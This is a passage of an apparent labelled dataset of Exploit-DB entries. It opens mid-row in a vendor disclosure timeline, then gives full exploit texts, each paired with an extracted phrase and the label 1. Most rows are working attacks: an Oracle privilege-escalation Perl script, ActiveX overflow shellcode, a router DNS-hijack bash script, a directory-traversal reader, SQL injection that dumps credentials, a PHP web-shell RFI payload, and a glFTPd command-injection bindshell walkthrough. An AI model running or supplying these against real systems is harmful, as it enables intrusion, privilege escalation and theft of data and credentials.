Core Security on the schedule sent, stating that fixing the vulnerabilities by June 2018 is unacceptable given current industry standards. Requested a review of the timeline or a thorough explanation that justifies such delay. 2017-11-01: Dell EMC answered back stating that after reviewing the original schedule, they said they believe they could have fixes ready for versions 8.0.x and 8.1.x by January 2018. Only caveat is the vulnerability 7.1 that might be pushed past January, although they said they think they could meet the January deadline. 2017-11-13: Core Security thanked Dell's review of the release dates and agreed on the proposed schedule, stating Core Security would like to publish a single advisory for all the vulnerabilities reported. Also requested CVE IDs for each of the issues. 2018-01-16: Core Security asked for a status update on the release date for the fixes since there was no update from Dell EMC. 2018-01-17: Dell EMC answered back stating they are awaiting confirmation from the product team about the exact dates of release. They said they will get back to us by the end of this week. Dell EMC also asked our GPG public key again. 2018-01-18: Core Security thanked for the update and sent the advisory's public GPG key. 2018-01-19: Dell EMC stated they are currently working on drafting their advisory and will send it back to us (including CVEs) once they have the necessary approvals. 2018-01-23: Dell EMC asked for our updated draft advisory. 2018-01-23: Core Security sent the updated draft advisory to Dell EMC. 2018-01-25: Dell EMC notified that the team are targeting to have the fix available by February 12th. Additionally, Dell will send its draft advisory by January 31th. 2018-01-29: Core Security thanked for the update and proposed February 14th as publication date. 2018-01-31: Dell EMC informed Core Security that they agreed to release on February 14th. They also provided CVE IDs for each vulnerability reported. 2018-02-01: Dell EMC sent its draft advisory. 2018-02-14: Advisory CORE-2017-0009 published.  9. **References**  [1] https://www.dellemc.com/en-us/storage/isilon/onefs-operating-system.htm  10. **About CoreLabs**  CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.  11. **About Core Security**  Core Security provides companies with the security insight they need to know who, how, and what is vulnerable in their organization. The company's threat-aware, identity & access, network security, and vulnerability management solutions provide actionable insight and context needed to manage security risks across the enterprise. This shared insight gives customers a comprehensive view of their security posture to make better security remediation decisions. Better insight allows organizations to prioritize their efforts to protect critical assets, take action sooner to mitigate access risk, and react faster if a breach does occur.  Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com   12. **Disclaimer**  The contents of this advisory are copyright (c) 2017 Core Security and (c) 2017 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/",setting a text/plain content-type and sending the request body as JSON_PAYLOAD=ignored,1
8608,"projectCMS 1.1b - Multiple Vulnerabilities *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	         MULTPLE REMOTE VULNERABILITIES		            	     | |--------------------------------------------------------------------------------------------| |                         	|    ProjectCMS v-1.1 Beta     |	 	             | |  CMS INFORMATION:		 ------------------------------			             | |										             | |-->WEB: http://projectcms.org/        				     			     | |-->DOWNLOAD: http://projectcms.org/uploads/projectcms_1.1_BETA.zip          	             | |-->DEMO: http://projectcms.org								     | |-->CATEGORY: CMS / Portal								     | |-->DESCRIPTION: ProjectCMS is an open source community project to create          	     | |		a simple content management system with an easy to follow install...         | |-->RELEASED: 2009-05-01								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3						                     | |-->DORK: ""Powered by ProjectCMS""							     | |-->CATEGORY: Remote Dir Remove/ Shell Upload-Image Upload/ Remote Dir Disclosure            | |-->AFFECT VERSION: <= 1.1 Beta						 		     | |-->Discovered Bug date: 2009-05-01							     | |-->Reported Bug date: 2009-05-01							     | |-->Fixed bug date: 2009-05-02								     | |-->Info patch(v-1.2 Beta): http://projectcms.org/ 				             | |-->Info extra(v-1.1 Beta): Fixed Sql injection vuln (Reported on 2009-04-29)		     | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ######################### ////////////////////////  REMOTE DIR REMOVE:  //////////////////////// #########################   File Vuln: HOME_PATH/admin_includes/admin_theme_remove.php  Var Vuln: GET var ""file"" Description: You can remove a dir remotely.  http://[HOST]/[HOME_PATH]/admin_includes/admin_theme_remove.php?file=../dir-to-remove/    ##################################### /////////////////////////////////////  SHELL UPLOAD/ARBITRARY IMAGE UPLOAD:  ///////////////////////////////////// #####################################   <<<<---------++++++++++++++ Condition: $allowuploads include php extension (not default) +++++++++++++++++--------->>>>   File Vuln: HOME_PATH/addons/imagelibrary/insert_image.php  Description: You can upload a PHP shell  http://[HOST]/[HOME_PATH]/addons/imagelibrary/insert_image.php   <<<<---------++++++++++++++ If the above condition is not met +++++++++++++++++--------->>>>  Description: You can upload a arbitrary image  http://[HOST]/[HOME_PATH]/addons/imagelibrary/insert_image.php    ############################## //////////////////////////////  REMOTE DIRECTORY DISCLOSURE:  ////////////////////////////// ##############################   File Vuln: HOME_PATH/addons/imagelibrary/select_image.php  Var Vuln: GET var ""dir"" Description: You can show arbitrary directory  http://[HOST]/[HOME_PATH]/addons/imagelibrary/select_image.php?dir=../    <<<-----------------------------EOF---------------------------------->>>ENJOY IT!   ####################################################################### ####################################################################### ##*******************************************************************## ## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ##        GREETZ TO: JosS and all SPANISH Hack3Rs community!         ## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-05-04]",a malicious file,1
29733,"PHP-Nuke 8.2.4 - Multiple Vulnerabilities [SOJOBO-ADV-13-04] - PHP-Nuke 8.2.4 multiple vulnerabilities   I. * Information * ================== Name : PHP-Nuke 8.2.4 multiple vulnerabilities Software : PHP-Nuke 8.2.4 and possibly below. Vendor Homepage : http://www.phpnuke.org/ Vulnerability Type : File Inclusion and Reflected Cross-Site Scripting Severity : High (4/5) Advisory Reference : SOJOBO-ADV-13-04 (http://www.enkomio.com/Advisories) Credits: Sojobo dev team Description: A File Inclusion and Reflected Cross Site Scripting vulnerability was discovered during the testing of Sojobo, Static Analysis Tool.   II. * Details * =============== A) File Inclusion in mainfile.php [Impact: 4/5]   Follow a trace to reach the vulnerable code.   File: /html/index.php 15: require_once(""mainfile.php"");   File: /html/mainfile.php 90: if (!ini_get('register_globals')) {  91:  @import_request_variables(""GPC"", """"); ... 274: if ((isset($newlang)) AND (stristr($newlang,"".""))) { 275:  if (file_exists(""language/lang-"".$newlang."".php"")) { ... 277:   include_once(""language/lang-"".$newlang."".php"");   due to a call to the function 'import_request_variables' it is possible to create the variable $newlang with an arbitrary value and to allow the inclusion of an arbitrary local file.   A test request is: /index.php?newlang=/../../index   B) Reflected Cross Site Scripting in index.php (of module Your_Account) [Impact: 3/5]   Follow a trace to reach the vulnerable code.   File: /html/mainfile.php 90: if (!ini_get('register_globals')) {  91:  @import_request_variables(""GPC"", """");   File: /html/modules/Your_Account/index.php 758: function logout() { 769: if (!empty($redirect)) { 770: echo ""<META HTTP-EQUIV=\""refresh\"" content=\""3;URL=modules.php?name=$redirect\"">"";   due to a call to the function 'import_request_variables' it is possible to create the variable $redirect with an arbitrary value and to inject arbitrary HTML code. Due to  XSS filtering the request must be done via POST with the injection data sent as payload.   A HTTP POST test request is:    POST /html/modules.php?name=Your_Account&op=logout HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/25.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://www.example.com/html/index.php Cookie: lang=english; Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 59   redirect=""><script src=""http://www.example.com/xss.html"" />   III. * Report Timeline * ========================   18 November 2013 - Advisory released, unable to contact the vendor.   IV. * About Sojobo * ==================== Sojobo allows you to find security vulnerabilities in your PHP web application source code before others do. By using the state of the art techniques Sojobo is able to identify the most critical vulnerabilities in your code  and limit the number of false positives.",malicious PHP code,1
42196,"Beetel BCM96338 Router - DNS Change #!/bin/bash # #   Beetel BCM96338 ADSL Router #   Unauthenticated Remote DNS Change Exploit # #  Copyright 2017 (c) Todor Donev <todor.donev at gmail.com> #  https://www.ethical-hacker.org/ #  https://www.facebook.com/ethicalhackerorg # #  Description:   #  The vulnerability exist in the web interface, which is  #  accessible without authentication.  # #  Once modified, systems use foreign DNS servers,  which are  #  usually set up by cybercriminals. Users with vulnerable  #  systems or devices who try to access certain sites are  #  instead redirected to possibly malicious sites. #   #  Modifying systems' DNS settings allows cybercriminals to  #  perform malicious activities like: # #    o  Steering unknowing users to bad sites:  #       These sites can be phishing pages that  #       spoof well-known sites in order to  #       trick users into handing out sensitive  #       information. # #    o  Replacing ads on legitimate sites:  #       Visiting certain sites can serve users  #       with infected systems a different set  #       of ads from those whose systems are  #       not infected. #    #    o  Controlling and redirecting network traffic:  #       Users of infected systems may not be granted  #       access to download important OS and software  #       updates from vendors like Microsoft and from  #       their respective security vendors. # #    o  Pushing additional malware:  #       Infected systems are more prone to other  #       malware infections (e.g., FAKEAV infection). # #  Disclaimer: #  This or previous programs is for Educational  #  purpose ONLY. Do not use it without permission.  #  The usual disclaimer applies, especially the  #  fact that Todor Donev is not liable for any  #  damages caused by direct or indirect use of the  #  information or functionality provided by these  #  programs. The author or any Internet provider  #  bears NO responsibility for content or misuse  #  of these programs or any derivatives thereof. #  By using these programs you accept the fact  #  that any damage (dataloss, system crash,  #  system compromise, etc.) caused by the use  #  of these programs is not Todor Donev's  #  responsibility. #    #  Use them at your own risk! # #    if [[ $# -gt 3 || $# -lt 2 ]]; then         echo ""               Beetel BCM96338 ADSL Router ""          echo ""           Unauthenticated Remote DNS Change Exploit""         echo ""  ===================================================================""         echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""         echo ""  Example: $0 133.7.133.7 8.8.8.8""         echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""         echo """"         echo ""      Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>""         echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""         exit; fi GET=`which GET 2>/dev/null` if [ $? -ne 0 ]; then         echo ""  Error : libwww-perl not found =/""         exit; fi         GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1",possibly malicious sites,1
25452,"Oracle 10g Database - 'SUBSCRIPTION_NAME' SQL Injection (1) source: https://www.securityfocus.com/bid/13236/info  Oracle database is prone to an SQL-injection vulnerability because the software fails to properly sanitize user-supplied data. The 'SUBSCRIPTION_NAME' parameter is vulnerable.  Packages that employ this parameter execute with 'SYS' user privileges. Exploiting the SQL-injection vulnerability can allow an attacker to gain 'SYS' privileges.  The attacker can exploit this issue using malformed PL/SQL statements to pass unauthorized SQL statements to the database. A successful exploit could allow the attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  This issue was originally disclosed in the 'Oracle Critical Patch Update - April 2005' advisory. BID 13139 Oracle Multiple Vulnerabilities describes the issues covered in the Oracle advisory. There is insufficient information at this time to associate this vulnerability with an identifier from the Oracle advisory.   #!/usr/bin/perl # # Remote Oracle DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION exploit (9i/10g) # # Grant or revoke dba permission to unprivileged user #  # Tested on ""Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"" #  #   REF:    http://www.securityfocus.com/archive/1/396133 # #   AUTHOR: Andrea ""bunker"" Purificato #           http://rawlab.mindcreations.com # #   DATE:   Copyright 2007 - Fri Feb 23 12:44:18 CET 2007 # # Oracle InstantClient (basic + sdk) required for DBD::Oracle # # # bunker@fin:~$ perl dbms_cdc_subscribe.pl -h localhost -s test -u bunker -p **** -r #  [-] Wait... #  [-] Revoking DBA from BUNKER... #  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement ""REVOKE DBA FROM BUNKER""] at dbms_cdc_subscribe.pl line 91. #  [-] Done! #  # bunker@fin:~$ perl dbms_cdc_subscribe.pl -h localhost -s test -u bunker -p **** -g #  [-] Wait... #  [-] Creating evil function... #  [-] Go ...(don't worry about errors)! #  DBD::Oracle::st execute failed: ORA-31425: subscription does not exist #  ORA-06512: at ""SYS.DBMS_CDC_SUBSCRIBE"", line 37 #  ORA-06512: at line 3 (DBD ERROR: OCIStmtExecute) [for Statement "" #  BEGIN #   SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION('''||BUNKER.own||'''); #  END; #  ""] at dbms_cdc_subscribe.pl line 114. #  [-] YOU GOT THE POWAH!! # # bunker@fin:~$ perl dbms_cdc_subscribe.pl -h localhost -s test -u bunker -p **** -r #  [-] Wait... #  [-] Revoking DBA from BUNKER... #  [-] Done! #    use warnings; use strict; use DBI; use Getopt::Std; use vars qw/ %opt /;  sub usage {     print <<""USAGE"";      Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]  Options:      -h     <host>     target server address      -s     <sid>      target sid name      -u     <user>     user      -p     <passwd>   password        -g|-r             (g)rant dba to user | (r)evoke dba from user     [-P     <port>     Oracle port]  USAGE     exit 0 }  my $opt_string = 'h:s:u:p:grP:'; getopts($opt_string, \%opt) or &usage; &usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} ); &usage if ( !$opt{g} and !$opt{r} ); my $user = uc $opt{u};  my $dbh = undef; if ($opt{P}) {     $dbh = DBI->connect(""dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}"", $opt{u}, $opt{p}) or die; } else {     $dbh = DBI->connect(""dbi:Oracle:host=$opt{h};sid=$opt{s}"", $opt{u}, $opt{p}) or die; }  my $sqlcmd = ""GRANT DBA TO $user""; print ""[-] Wait...\n"";  if ($opt{r}) {     print ""[-] Revoking DBA from $user...\n"";     $sqlcmd = ""REVOKE DBA FROM $user"";     $dbh->do( $sqlcmd );     print ""[-] Done!\n"";     $dbh->disconnect;     exit; }  print ""[-] Creating evil function...\n""; $dbh->do( qq{ CREATE OR REPLACE FUNCTION OWN RETURN NUMBER   AUTHID CURRENT_USER AS   PRAGMA AUTONOMOUS_TRANSACTION;  BEGIN  EXECUTE IMMEDIATE '$sqlcmd'; COMMIT;   RETURN(0); END; } );   print ""[-] Go ...(don't worry about errors)!\n""; my $sth = $dbh->prepare(qq{ BEGIN  SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION('''||$user.own||'''); END; }); $sth->execute; $sth->finish; print ""[-] YOU GOT THE POWAH!!\n""; $dbh->disconnect; exit;",using malformed PL/SQL statements,1
6159,"Gregarius 0.5.4 - SQL Injection ########################################################## # GulfTech Security Research                July 29, 2008 ########################################################## # Vendor : Marco Bonetti # URL : http://www.gregarius.net/ # Version :  Gregarius <= 0.5.4 # Risk : SQL Injection ##########################################################   Description: Gregarius is a popular web-based RSS/RDF/ATOM feed aggregator written in php. There are some SQL Injection issues in Gregarius that allow for the disclosure of database contents and ultimately the complete compromise of the Gregarius installation via exposed admin credentials. It is advised that Gregarius users update their gregarius installations as soon as possible.    SQL Injection: Gregarius contains a number of SQL Injection issues that allow for an attacker to expose admin credentials with no kind of authentication needed. Lets have a look at the following code taken from /ajax.php   function __exp__getFeedContent($cid) {     ob_start();     rss_require('cls/items.php');          $readItems = new ItemList();      $readItems -> populate("" not(i.unread & "". RSS_MODE_UNREAD_STATE  ."")     and i.cid= $cid"", """", 0, 2, ITEM_SORT_HINT_READ);     $readItems -> setTitle(LBL_H2_RECENT_ITEMS);     $readItems -> setRenderOptions(IL_TITLE_NO_ESCAPE);     foreach ($readItems -> feeds[0] -> items as $item) {         $item -> render();     }     $c = ob_get_contents();          ob_end_clean();     return ""$cid|@|$c""; }   The above function is called by sajax_handle_client_request() and allows for an attacker to specify the content of $cid via the rsargs[] array. This being the case an attacker is able to influence the query regardless of magic_quotes_gps settings etc.  /ajax.php?rs=__exp__getFeedContent&rsargs[]=-99 UNION SELECT concat( char(58),uname,char(58),password),2,3,4,5,6,7,8,9,0,1,2,3 FROM users/*  The above query would successfully dump the users table to the browser. The password hashes in the database are md5 encrypted, but an attacker only need to md5 encrypt that password hash and place it in a cookie with the format of user|hash to gain access to the administrative controls.    Solution: The Gregarius developers have been made aware of this issue, and users are encouraged to upgrade as soon as possible.    Credits: James Bercegay of the GulfTech Security Research Team  # milw0rm.com [2008-07-29]",exposed admin credentials,1
47818,"Wing FTP Server 6.0.7 - Unquoted Service Path # Exploit Title: Wing FTP Server 6.0.7 - Unquoted Service Path # Date: 2019-12-30 # Exploit Author: Nawaf Alkeraithe # Vendor Homepage: https://www.wftpserver.com/ # Version: 6.0.7 # Tested on: Windows 10 # CVE : N/A  # PoC:  C:\Users\user>sc qc ""Wing FTP Server"" [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: Wing FTP Server         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files (x86)\Wing FTP Server\WFTPServer.exe service         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : Wing FTP Server         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem",any executable malicious file,1
19690,"glFTPd 1.17.2 - Code Execution source: https://www.securityfocus.com/bid/891/info  GlFtpd is a popular alternative to the mainstream unix ftp daemons and is currently in wide use on the internet. There are three known serious vulnerabilities in GlFtpd. The first problem is an account which is created by default upon installation of the software. The username and password for this account are both ""gltftpd"" and the uid is 0 (root). This account can only be used by users connecting from localhost. This is a problem because ""local users"" can log into a host's glftpd with root privileges (and compromise the entire system). The second problem is world writeable ~/site directory. The last problem is the possibility to execute arbitrary commands on the target host. Glftpd comes with a feature called ZIPCHK, which is a command sent to the ftpd to check the integrity of a zip file on the server remotely. ZIPCHK executes ""unzip"" on the file without validating the filename input. With a special filename such as "" ; ls"", it is possible to execute arbitrary commands as the uid of glftpd.   Exploit Information:  	1) & 2) are traditionally bad. Problems are obvious.   	3) This is quite simple a user need only have some place to upload files:  		- You will need to build some kind of backdoor to allow you access, using bindshell.c (again)  		$ gcc bindshell.c -o b -static 	 		- Create an empty file called "" ; bash blah;"" 		- Create an empty file called "" ; unzip blah;""  		$ > "" ; bash blah;""		  		- Create a script called ""blah"" :   		$ cat > blah 		#!/bin/bash 		./b & 		^D  		- ""ZIP"" these files up.  		 		$ zip blah.zip blah b  		- Login to your FTP server. Now upload your files:  		ftp> put blah.zip 		ftp> put "" ; bash blah;"" 		ftp> put "" ; unzip blah.zip;""  		- Because glFtpD attempts to convert spaces in filenames to underscores, youll need to rename 		  them back. 	 		ftp> quote rnfr ""_;_bash_blah;"" 		ftp> quote rnto "" ; bash blah;"" 		ftp> quote rnfr ""_;_unzip_blah.zip;"" 		ftp> quote rnto "" ; unzip blah.zip;""  		- Now run a ZIPCHK on the unzip one:  		ftp> quote SITE ZIPCHK "" ; unzip blah.zip;"" 		 		- Hurray, now do a few ls commands till you get a file listing. Now run:  		ftp> quote SITE ZIPCHK "" ; bash blah;""  		- glFtpD will spit out an error message. Ignore it. Now telnet to the port defined within 		  bindshell.c.  		- Once your on. If you attacked the glftpd account (or any uid = 0 account), you may now use simple chroot() 		  breaking techniques (http://www.suid.kg/source/breakchroot.c) to have run of the entire box.  		- If you did not have a uid == 0 account. Youll probably be in a chroot environment and you  		  dont really have a way out except to:  			- check /etc/passwd (really $GLFTPDHOME/etc/passwd) 			- Crack a uid == 0 passwd, maybe the glftpd account is still in there 			- Use your imagination.   Working Papers:  	See the spectacle at http://www.suid.kg/advisories/003_wp.txt  Links: 	www.glftpd.org				-	Glftpd Home page 	www.suid.kg/source/bindshell.c		-	bindshell.c 	www.suid.kg/advisories/003_wp.txt	-	Example attack  Greets:  		^moo^, yowie, cr, duke, silvio, n1ck, 		w00w00, and last but not least ADM",log into a host's glftpd with root privileges,1
4328,"Postcast Server Pro 3.0.61 / Quiksoft EasyMail - 'emsmtp.dll 6.0.1' Remote Buffer Overflow <!-- Postcast Server Pro 3.0.61 / Quiksoft EasyMail SMTP Object (emsmtp.dll 6.0.1)      remote buffer overflow exploit      (ie6 / xp sp2 version)  passing more than 539 chars to SubmitToExpress method:  EAX 00000400 ECX 0013DD24 ASCII ""Error Creating File: AAAA ... EDX C0403FFF EBX FFFFFFFF ESP 0013D5E4 EBP 0013DD08 ESI 41414141 EDI 0013DD24 ASCII ""Error Creating File: AAAA ... EIP 06986256 emsmtp.06986256  ... CMP DWORD PTR DS:[ESI+180],1 Access violation when reading 414142C1  seh overwrite follows:  EAX 00000000 ECX 41414141 EDX 7C9137D8 ntdll.7C9137D8 EBX 00000000 ESP 0013D214 EBP 0013D234 ESI 00000000 EDI 00000000 EIP 41414141  and if we pass a readable address to ESI:  A*539 + esi + A*99999  we fall in a more convenient situation:  EAX 00000000 ECX 0013DF7C ASCII ""AAAA... EDX 001835D0 EBX 00000000 ESP 0013DF68 ASCII ""AAAA... EBP 41414141 ESI 05542A08 EDI 05586250 ASCII ""AAAA... EIP 41414141  Object safety report: RegKey Safe for Script: true RegKey Safe for Init: true  vendor urls: http://www.postcastserver.com/              http://www.quicksoftcorp.com/  rgod. site: http://retrogod.altervista.org ->   <html> <object classid='clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9' id='EasyMailSMTPObj' /></object> <script language='vbscript'>       'open calc.exe      scode = unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _              unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _              unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _              unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _              unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _              unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _              unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _              unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _              unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _              unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _              unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _              unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _              unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _              unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _              unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _              unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _              unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _              unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _              unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _              unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _              unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _              unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"")   esi = unescape(""%01%01%01%01"") ebp = ""bbbb"" nop = string(16,unescape(""%90"")) eip = unescape(""%78%2c%41%7e"") '0x7E412C78 jmp esp user32.dll bof = string(539,""A"") + esi + ebp + eip + nop + scode  EasyMailSMTPObj.SubmitToExpress bof  </script> </html>  # milw0rm.com [2007-08-28]",pass a readable address to ESI:,1
4859,"EkinBoard 1.1.0 - Arbitrary File Upload / Authentication Bypass ----[ EkinBoard Remote File Upload / Auth Bypass ... ITDefence.ru Antichat.ru ]  							EkinBoard >= 1.1.0 Remote File Upload / Auth Bypass 							Eugene Minaev underwater@itdefence.ru  				___________________________________________________________________ 			____/  __ __ _______________________ _______  _______________    \  \   \ 			/ .\  /  /_// //              /        \       \/      __       \   /__/   / 			/ /     /_//              /\        /       /      /         /     /___/ 			\/        /              / /       /       /\     /         /         / 			/        /               \/       /       / /    /         /__       //\ 			\       /    ____________/       /        \/    __________// /__    // /    			/\\      \_______/        \________________/____/  2007    /_//_/   // //\ 			\ \\                                                               // // / 			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / .  			. \_\\________[________________________________________]_________//_//_/ . . 			 		We can bypass admin authorization if register_globals on . All admin panel script include this code 		 		<?php 		if(!in_array(2, $_groups)){ 		die(""<center><span class=red>You need to be an admin to access this page!</span></center>""); 		}  		?> 		 		test1.ru/skvoznoy/backup.php?_groups[]=2 		 		There is a bug in upload function . We can upload any file bypass filters . Name your shell like  		file.php.gif and select it as your avatar . Then check uploaded/avatars/filename_your_id.php  ----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]  # milw0rm.com [2008-01-07]",a specially crafted .gif file,1
23132,"Advantech Studio 7.0 - SCADA/HMI Directory Traversal # Exploit Title: Advantech Studio v7.0 SCADA/HMI Directory Traversal 0-day # Google Dork: N/A # Date: 2012-12-03 # Exploit Author: Nin3 # Vendor Homepage: http://advantech.com.tw # Version: 7.0 Build Number 0501.1111.0402.0000 # Tested on: Windows # CVE : N/A  ''' Advantech Studio v7.0 SCADA/HMI has a built in web server NTWebServer.exe, the web server is a standalone executable that is used along side every project' to serve as a web based management system with the help of an activex.  The flaw occurs because of a lack of any check on the path of the file requested. in function sub_401A90:  .text:00402A4A                 push    0               ; dwFlagsAndAttributes .text:00402A4C                 push    3               ; dwCreationDisposition .text:00402A4E                 push    3               ; dwShareMode .text:00402A50                 push    80000000h       ; dwDesiredAccess .text:00402A55                 mov     edx, [ebp+lpFileName] .text:00402A58                 push    edx             ; lpFileName .text:00402A59                 lea     ecx, [ebp+var_1C] .text:00402A5C                 call    sub_401A90   sub_401A90 use CreateFileW function directly.  .text:00401A97                 push    0               ; hTemplateFile .text:00401A99                 mov     eax, [ebp+dwFlagsAndAttributes] .text:00401A9C                 push    eax             ; dwFlagsAndAttributes .text:00401A9D                 mov     ecx, [ebp+dwCreationDisposition] .text:00401AA0                 push    ecx             ; dwCreationDisposition .text:00401AA1                 push    0               ; lpSecurityAttributes .text:00401AA3                 mov     edx, [ebp+dwShareMode] .text:00401AA6                 push    edx             ; dwShareMode .text:00401AA7                 mov     eax, [ebp+dwDesiredAccess] .text:00401AAA                 push    eax             ; dwDesiredAccess .text:00401AAB                 mov     ecx, [ebp+lpFileName] .text:00401AAE                 push    ecx             ; lpFileName .text:00401AAF                 call    ds:CreateFileW  ''' import argparse import httplib  MAX_NESTED_DIRECTORY = 32  def main():     parser = argparse.ArgumentParser()     parser.add_argument('-d')     parser.add_argument('-p')     parser.add_argument('-f')       args = parser.parse_args()     if args.d == None or args.p == None or args.f == None:         print ""[!]EXAMPLE USAGE: traverse.py -d 127.0.0.1 -p 80 -f windows/system.ini""         return     httpConn = httplib.HTTPConnection(args.d, int(args.p))     for i in xrange(0, MAX_NESTED_DIRECTORY):         temp = MakePath(args.f, i)         httpConn.request('GET', temp)         resp = httpConn.getresponse()         content =  resp.read()         if resp.status == 404:             print 'Not found ' + temp         else:             print 'Found ' + temp             print'------------------------------------------'             print content             print'---------------------------------------EOF'             break                    def MakePath(f, count):     a = """"     for i in xrange(0, count):         a = a + ""../""     return a + f  if __name__ == ""__main__"":     main()",a malicious link,1
22298,"Typo3 3.5 b5 - 'Translations.php' Remote File Inclusion source: https://www.securityfocus.com/bid/6984/info  TYPO3 is prone to an issue that may allow remote attackers to include files located on attacker-controlled servers.  This vulnerability is as a result of insufficient sanitization performed on remote user-supplied data. Under some circumstances, it is possible for remote attackers to influence the path for an include file to point to an external file by manipulating URI parameters.  If the remote file is a malicious file, this may be exploited to execute arbitrary system commands in the context of the web server.   http://localhost/<%3f %60echo %27<%3fpassthru(%5c%24c)%3f>%27 >> ./x.php%60 %3f> http://localhost/typo3/typo3/dev/translations.php?ONLY=relative_apache_path/apache/logs/error_log%00'",manipulating URI parameters,1
